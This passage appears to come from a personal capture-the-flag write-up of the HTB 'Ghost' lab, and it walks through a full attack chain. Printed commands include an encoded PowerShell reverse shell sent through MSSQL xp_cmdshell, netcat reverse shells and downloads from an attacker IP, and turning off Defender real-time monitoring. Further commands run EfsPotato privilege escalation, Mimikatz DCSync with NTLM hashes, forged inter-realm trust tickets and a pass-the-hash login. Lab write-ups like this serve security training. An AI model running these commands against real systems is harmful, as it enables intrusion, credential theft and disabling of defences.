EXECUTE ('EXECUTE AS LOGIN = ''sa''; EXEC xp_cmdshell "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMQA0ADkAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"') AT [PRIMARY];
```
-> is too long. Maximum length is 128...

Tried staged payload but didnt work... mb I screwed up somewhere...
```sql
EXECUTE ('EXECUTE AS LOGIN = ''sa''; EXEC xp_cmdshell "powershell -e SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xMC4xMC4xNS4xNDkvc2hlbGwucHMxJyk7"') AT [PRIMARY];
```

Let's try uploading netcat. I will get rev shell with that. First upload:
```sql
EXECUTE ('EXECUTE AS LOGIN = ''sa''; EXEC xp_cmdshell "powershell -c iwr http://10.10.15.149/nc64.exe -OutFile C:\programdata\nc64.exe"') AT [PRIMARY];
```

Now get rev shell:
```sql
EXECUTE ('EXECUTE AS LOGIN = ''sa''; EXEC xp_cmdshell "C:\programdata\nc64.exe 10.10.15.149 443 -e powershell"') AT [PRIMARY];
```

but before that start listener. And we got shell ! 
![[Pasted image 20261018104214.png]]

## SeImpersonatePrivilege

I see it... `SeImpersonatePrivilege` !
![[Pasted image 20261018104233.png]]

Then I upload JuicyPotato to abuse impersonate privileges but I got this message:
> Operation did not complete successfully because the file contains a virus or
   potentially unwanted softwareAt line:1 char:67....

Looks like there is some AntiVirus shit...

Ok then I said. Found this potato -> https://github.com/zcgonvh/efspotato

Upload it to primary:
```powershell
iwr http://10.10.15.149/EfsPotato.cs -OutFile EfsPotato.cs
```

And we have to build it:
```powershell
C:\Windows\Microsoft.net\framework\v4.0.30319\csc.exe EfsPotato.cs -nowarn:1691,618
```

Test run:
![[Pasted image 20261018105912.png]]

It works !

Now let's get rev shell with the same netcat:
```powershell
./EfsPotato.exe 'C:\programdata\nc64.exe 10.10.15.149 8888 -e powershell'
```

And we compomised PRIMARY domain !
![[Pasted image 20261018110010.png]]


# GHOST.HTB TAKEOVER
## Trust enumeration

But it's not over yet. We have to compromise domain controller...

upload PowerView
```powershell
iwr http://10.10.15.149/PowerView.ps1 -OutFile PowerView.ps1
```
-> AV error...

let's disable it as we admin on this domain:
```powershell
Set-MpPreference -DisableRealtimeMonitoring $True
```

Now download and import:
```
. ./PowerView.ps1
```

Let's enum some trusts:
![[Pasted image 20261018110556.png]]

Return to our bloodhound output:
![[Pasted image 20261018135720.png]]


## Abusing by Forging Interdomain Trust Ticket 

I’ll upload [Mimikatz](https://github.com/gentilkiwi/mimikatz) to Ghost and use it to dump the hashes for the domain:

Now we need the trust key that the child domain `CORP.GHOST.HTB` uses to authenticate to the parent `GHOST.HTB`. The relevant account is the trust account `GHOST$`.
```powershell
mimikatz # lsadump::dcsync /all /csv
[DC] 'corp.ghost.htb' will be the domain
[DC] 'PRIMARY.corp.ghost.htb' will be the DC server
[DC] Exporting domain 'corp.ghost.htb'
502     krbtgt  69eb46aa347a8c68edb99be2725403ab        514
500     Administrator   41515af3ada195029708a53d941ab751        512
1000    PRIMARY$        27f92da5e3d79962020ddebc08ed7d70        532480
1103    GHOST$  8e3269d08b3f6a73c3d613416cb2ca0b        2080
```

The SID of the Enterprise Admins group of the root domain is
```powershell
Get-DomainGroup -Domain ghost.htb -Identity "Enterprise Admins" | select distinguishedname,objectsid
```
-> `S-1-5-21-4084500788-938703357-3654145966-519`


The child domain sid:
```powershell
(Get-ADDomain).DomainSID.Value
```
-> `S-1-5-21-2034262909-2733679486-179904498`


Next I will use ticketer to craft a ticket. for this we need next flags:
* `-nthash` - the hash to authenticate as the trust account.
* `-domain-sid <corp.ghost.htb SID>` - the child domain sid we got above.
* `-domain corp.ghost.htb` - child's domain.
* `-extra-sid <Enterprise Admin's Group on target domain>` - high privileged group sid from `ghost.htb` domain.
* `-spn krbtgt/ghost.htb` - the target service.
* `<username>` - random value.

so It looks like this:
```bash
ticketer.py -nthash 8e3269d08b3f6a73c3d613416cb2ca0b -domain corp.ghost.htb -domain-sid S-1-5-21-2034262909-2733679486-179904498 -extra-sid S-1-5-21-4084500788-938703357-3654145966-519
 -spn krbtgt/ghost.htb tester
```

Export ticket. and as we can se it worked!
![[Pasted image 20261018180538.png]]

Now we have only TGT ( ticket granting ticket ), we need to request ST ( service ticket ). I do it using `getST.py`. I'll request ST for CIFS service that used for share access:
```bash
getST.py -spn cifs/dc01.ghost.htb -k -no-pass ghost.htb/tester@dc01.ghost.htb
```

Export this ticket as well:
![[Pasted image 20261018180608.png]]

Now we can use `secretsdump` to dump all domain's hashes:
```bash
secretsdump.py -k -no-pass -just-dc tester@dc01.ghost.htb
```

We only need Administrator's ntlm hash:
```bash
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1cdb17d5c14ff69e7067cffcc9e470bd:::
...SNIP...
```

winrm in:
```bash
evil-winrm -i ghost.htb -u 'Administrator' -H '1cdb17d5c14ff69e7067cffcc9e470bd'
```

and grab root flag:
![[Pasted image 20261018180742.png]]



---
## Abusing trusts from windows
```powershell
.\mimikatz.exe "lsadump::trust /patch" exit 
```

![[Pasted image 20261019072849.png]]

```powershell
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:CORP.GHOST.HTB /sid:S-1-5-21-2034262909-2733679486-179904498 /sids:S-1-5-21-4084500788-938703357-3654145966-519  /rc4:082e47b4b85253efa5133b8b1240e474 /service:krbtgt /target:GHOST.HTB /ticket:ticket.kirbi" exit
```

![[Pasted image 20261019072732.png]]

```powershell
.\Rubeus.exe asktgs /ticket:ticket.kirbi /dc:dc01.ghost.htb /service:CIFS/dc01.ghost.htb /nowrap /ptt
```

![[Pasted image 20261019072801.png]]

Now we can access `dc01.ghost.htb` share!

